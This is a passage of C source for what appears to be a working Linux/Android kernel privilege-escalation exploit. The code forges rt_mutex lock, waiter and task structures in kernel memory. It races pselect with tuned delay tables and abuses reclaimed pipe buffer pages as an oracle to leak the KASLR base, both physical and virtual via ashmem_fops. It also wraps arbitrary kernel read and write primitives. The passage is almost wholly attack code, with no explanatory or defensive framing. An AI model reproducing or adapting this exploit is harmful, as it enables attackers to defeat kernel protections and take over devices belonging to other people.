    disable_rseq_for_thread();
    slide_log_child_context();
    _exit(slide_child_trigger_write() ? 0 : 1);
  }
  int status = 0;
  SYSCHK(waitpid(child, &status, 0));
  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
  pr_info("p0 physical write status=%d ok=%d\n", status, ok);
  return ok;
}

#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
static const int slide_physical_slot_delays[] = {
  SLIDE_PHYSICAL_SLOT_DELAYS_USEC
};
#endif

static int slide_trigger_physical_slot(size_t slot) {
  if (!select_slide_payload_index(slot)) {
    return 0;
  }

  int base_delay = (int)slide_enter_delay_usec();
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
  int attempts = (int)(sizeof(slide_physical_slot_delays) /
                       sizeof(slide_physical_slot_delays[0]));
#else
  int attempts = 1;
#endif

  for (int attempt = 1; attempt <= attempts; attempt++) {
    int delay = base_delay;
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
    delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
#endif
#if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
    if (p0_virtual_base_probe) {
      delay = SLIDE_VIRTUAL_BASE_DELAY_USEC;
    }
#endif
    char delay_arg[16];
    slide_pselect_nfds = PSELECT_ROUTE_NFDS;
    slide_syscall_pad = 0;
    snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
    SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
    if (slide_trigger_physical_state()) {
      pr_info("p0 physical slot=%zu write attempt=%d/%d delay=%d nfds=%d "
              "pad=%d\n",
              slot, attempt, attempts, delay, slide_pselect_nfds,
              slide_syscall_pad);
      return 1;
    }
  }

  pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
           slot, attempts);
  return 0;
}

static int slide_restore_physical_oracle(void) {
  int gate_restored =
      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
  int probe_restored =
      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
  pr_info("p0 physical restore triggers gate=%d probe=%d "
          "gate_page=%016zx probe_page=%016zx\n",
          gate_restored, probe_restored,
          p0_gate_page_struct, p0_probe_page_struct);
  return gate_restored && probe_restored;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int app_trigger_fops_slide_slot(size_t slot) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
  if (!select_slide_payload_index(slot)) {
    return 0;
  }
  int delay = 0;
#ifdef APP_FOPS_PSELECT_DELAY_USEC
  delay = APP_FOPS_PSELECT_DELAY_USEC;
#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
    APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  delay_index++;
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route slot=%zu parent=%016zx target=%016zx "
          "lock=%016zx delay=%d\n",
          slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay);
  return slide_trigger_physical_state();
}

int app_trigger_fops_slide_route(void) {
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
#else
  return app_trigger_fops_slide_slot(0);
#endif
}

#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot) {
  return app_trigger_fops_slide_slot(slot);
}
#endif
#else
int app_trigger_fops_slide_route(void) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
  if (!select_slide_payload_index(0)) {
    return 0;
  }
  int delay = 0;
#if defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  delay_index++;
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
          "delay=%d\n",
          slide_oracle_parent, slide_oracle_target, fake_lock, delay);
  return slide_trigger_physical_state();
}
#endif

static int slide_leak_physical_base(void) {
  size_t started = gettime_ns();
  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 physical pipe preparation failed\n");
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
  const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
#else
  const int fresh_page_attempts = 1;
#endif
  int fresh_attempt = 1;
  int search_batch = 0;
#ifdef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
  const int max_search_batches = APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
#else
  const int max_search_batches = fresh_page_attempts;
#endif
  int refresh_oracle = 0;
  while (fresh_attempt <= fresh_page_attempts &&
         search_batch < max_search_batches) {
#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
    if (refresh_oracle) {
      reset_pipe_attempt();
      if (!prepare_p0_pipe_oracle()) {
        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
        return 0;
      }
      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
      refresh_oracle = 0;
    }
#endif
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    search_batch++;
    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
            search_batch, max_search_batches, fresh_attempt,
            fresh_page_attempts, page_base);
    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
            fresh_attempt, fresh_page_attempts, page_base);
    if (!page_base) {
#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
      fresh_attempt++;
      refresh_oracle = 1;
#endif
      continue;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
               fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    int gate_result = verify_p0_pipe_oracle_gate();
    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
            gate_result, fresh_attempt, fresh_page_attempts);
    if (getenv("P0_ORACLE_GATE_DIAG")) {
      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
      if (gate_result != 0) {
        slide_restore_physical_oracle();
      }
      return 0;
    }
    if (gate_result == 0) {
      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    app_publish_p0_dirty();
    if (gate_result < 0) {
      pr_error("p0 physical pipe gate changed unexpected pages\n");
      slide_restore_physical_oracle();
      return 0;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t offset = scan_p0_pipe_oracle();
    if (offset == (uintptr_t)-1) {
      slide_restore_physical_oracle();
      return 0;
    }
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
    if (offset > P0_ORACLE_PROBE_OFFSET) {
      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
               "probe=%08llx\n",
               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t source_offset = offset;
    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
            "runtime_slide=%08zx\n",
            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
            offset);
#endif
    if (!slide_restore_physical_oracle()) {
      return 0;
    }
    slide_p0_session_fresh = 1;
    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
               elapsed_ms, fresh_attempt, fresh_page_attempts);
    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
  }
  return 0;
#else
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 physical pipe gate trigger failed\n");
    return 0;
  }
  int gate_result = verify_p0_pipe_oracle_gate();
  if (getenv("P0_ORACLE_GATE_DIAG")) {
    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
    if (gate_result != 0) {
      slide_restore_physical_oracle();
    }
    return 0;
  }
  if (gate_result == 0) {
    pr_warning("p0 physical pipe reclaim miss\n");
    return 0;
  }
  app_publish_p0_dirty();
  if (gate_result < 0) {
    pr_error("p0 physical pipe gate changed unexpected pages\n");
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    slide_restore_physical_oracle();
    return 0;
  }
  uintptr_t offset = scan_p0_pipe_oracle();
  if (offset == (uintptr_t)-1) {
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_restore_physical_oracle()) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
#endif
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_leak_virtual_base(uintptr_t physical_offset) {
  size_t started = gettime_ns();
  uint64_t ashmem_fops = 0;
  int gate_result = 0;
  int restore_needed = 0;
  int restore_ok = 0;
  int success = 0;
  slide_p0_offset = physical_offset;
  p0_virtual_base_probe = 1;

  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 virtual pipe preparation failed\n");
    goto out;
  }
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    goto out;
  }
  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
  app_publish_p0_dirty();
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 virtual pipe gate trigger failed\n");
    goto out;
  }
  gate_result = verify_p0_pipe_oracle_gate();
  if (gate_result != 1) {
    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
    if (gate_result != 0) {
      restore_needed = 1;
    }
    goto out;
  }
  restore_needed = 1;
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    goto out;
  }
  ashmem_fops = scan_p0_virtual_base_pointer();

out:
  if (restore_needed) {
    restore_ok = slide_restore_physical_oracle();
  }
  p0_virtual_base_probe = 0;
  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
    return 0;
  }

  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
      base + ASHMEM_FOPS_OFF != ashmem_fops) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
             "base=%016llx\n", elapsed_ms,
             (unsigned long long)ashmem_fops,
             (unsigned long long)base);
  success = slide_commit_virtual_base(base, "physical-data");
  return success;
}
#endif

static void dump_p0_oracle_words(int fd, const char *phase,
                                 uintptr_t address, size_t count) {
  for (size_t index = 0; index < count; index++) {
    uintptr_t current = address + index * sizeof(uint64_t);
    uint64_t value = kernel_read64(fd, current);
    pr_info("p0 diagnostic %s addr=%016zx value=%016llx\n",
            phase, current, (unsigned long long)value);
  }
}

static int p0_diag_write32(int fd, uintptr_t address, uint32_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                                  uintptr_t parent, uintptr_t target,
                                  uintptr_t task, uintptr_t lock) {
  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
      !p0_diag_write64(fd, waiter + 0x08, 0) ||
      !p0_diag_write64(fd, waiter + 0x10, 0)) {
    return 0;
  }
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         parent) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
#if COMPACT_RT_MUTEX_WAITER
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
#endif
         p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
#if COMPACT_RT_MUTEX_WAITER
         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
#endif
         ;
#else
  return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         parent) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
  uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
  uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
  uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
  uintptr_t parent = direct_to_page(payload_base);
  uintptr_t target = pipebuf_page_base +
                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
  static const char marker[] = "RMG-P0-ORACLE-GATE";
  uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
  if (getenv("P0_ORACLE_READ_DIAG")) {
    marker_address = payload_base;
  }

  if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
          (ssize_t)(sizeof(marker) - 1) ||
      !p0_diag_write32(fd, lock + 0x00, 0) ||
      !p0_diag_write64(fd, lock + 0x08, waiter) ||
      !p0_diag_write64(fd, lock + 0x10, waiter) ||
      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
      !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
      !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
      !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
                       FAKE_TASK_PRIO) ||
      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
      !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
    return 0;
  }

  fake_task = task;
  fake_lock = lock;
  fake_w0 = waiter;
  slide_oracle_parent = parent;
  slide_oracle_target = target;
  return 1;
}

int run_p0_pipe_oracle_diagnostic(int fd) {
  uintptr_t fops_page_base = page_base;
  if (!prepare_p0_pipe_oracle() ||
      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
    pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
             pipebuf_page_base, fops_page_base);
    return 0;
  }

  uintptr_t target_start = slide_oracle_target - 0x20;
  uintptr_t parent_start = slide_oracle_parent;
  uint64_t original_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic prepared pipe=%016zx source=%016zx parent=%016zx "
          "target=%016zx original=%016llx\n",
          pipebuf_page_base, fops_page_base, slide_oracle_parent,
          slide_oracle_target, (unsigned long long)original_target);
  dump_p0_oracle_words(fd, "target-before", target_start, 20);
  dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
  if (!slide_trigger_physical_state()) {
    pr_error("p0 diagnostic gate trigger failed\n");
    return 0;
  }
  dump_p0_oracle_words(fd, "target-after", target_start, 20);
  dump_p0_oracle_words(fd, "parent-after", parent_start, 8);
  uint64_t changed_target = kernel_read64(fd, slide_oracle_target);
  if (getenv("P0_ORACLE_READ_DIAG")) {
    int gate_ok = verify_p0_pipe_oracle_gate();
    pr_info("p0 diagnostic pipe read gate=%d\n", gate_ok);
    fflush(NULL);
    for (;;) {
      sleep(60);
    }
  }
  int restore_ok = p0_diag_write64(fd, slide_oracle_target, original_target);
  uint64_t restored_target = kernel_read64(fd, slide_oracle_target);
  pr_info("p0 diagnostic gate complete expected=%016zx changed=%016llx "
          "restore=%d restored=%016llx\n",
          slide_oracle_parent, (unsigned long long)changed_target,
          restore_ok, (unsigned long long)restored_target);
  return restore_ok && restored_target == original_target;
}
#endif

static int slide_commit_stext(uint64_t stext, const char *source) {
  if (stext < KIMAGE_TEXT_BASE) {
    return 0;
  }
  uint64_t slide = stext - KIMAGE_TEXT_BASE;
  if (slide > 0x1f0000ULL || (slide & 0xffffULL) != 0) {
    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
               source, (unsigned long long)stext,
               (unsigned long long)slide);
    return 0;
  }
  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
               slide_p0_offset, (unsigned long long)slide);
    return 0;
  }
  kaslr_base = stext;
  kaslr_slide = slide;
  slide_p0_offset = slide;
  kaslr_done = 1;
  app_publish_p0_offset(slide_p0_offset);
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "slide=%016llx\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

int slide_leak_kernel_base(void) {
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
    if (gate_page_arg && probe_page_arg) {
      char *gate_end = NULL;
      char *probe_end = NULL;
      errno = 0;
      p0_gate_page_struct = (uintptr_t)strtoull(
          gate_page_arg, &gate_end, 0);
      p0_probe_page_struct = (uintptr_t)strtoull(
          probe_page_arg, &probe_end, 0);
      if (errno || gate_end == gate_page_arg || *gate_end ||
          probe_end == probe_page_arg || *probe_end) {
        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
                 gate_page_arg, probe_page_arg);
        return 0;
      }
    }
    pr_info("slide forced p0 offset=%08llx\n", value);
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
    if (virtual_base_arg && *virtual_base_arg) {
      char *base_end = NULL;
      errno = 0;
      unsigned long long virtual_base =
          strtoull(virtual_base_arg, &base_end, 0);
      slide_p0_offset = (uintptr_t)value;
      if (errno || base_end == virtual_base_arg || *base_end ||
          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
        return 0;
      }
      return 1;
    }
    return slide_leak_virtual_base((uintptr_t)value);
#else
    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
#endif
  }
  return slide_leak_physical_base();
#else
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  uintptr_t forced_offset = 0;
  int forced = forced_offset_arg && *forced_offset_arg;
  if (forced) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    forced_offset = (uintptr_t)value;
    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
    return slide_commit_stext(
        KIMAGE_TEXT_BASE + forced_offset, "forced");
  }

  uint64_t existing_stext = slide_read_stext();
  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
    return 1;
  }

  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
#endif
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    if (forced) {
      slide_p0_offset = forced_offset;
    } else {
#ifdef SLIDE_P0_OFFSET_CANDIDATES
      slide_p0_offset = slide_p0_offsets[
          (size_t)(attempt - 1) %
          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
#else
      slide_p0_offset = 0;
#endif
    }
    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
            "bootid_target=%016llx\n",
            attempt, max_attempts, slide_p0_offset,
            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
            (unsigned long long)(
                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!select_slide_payload_slot(slide_p0_offset)) {
      pr_error("slide payload slot missing p0_offset=%08zx\n",
               slide_p0_offset);
      return 0;
    }
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      slide_log_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    if (slide_commit_stext(stext, "pselect")) {
      return 1;
    }
  }

  return 0;
#endif
}
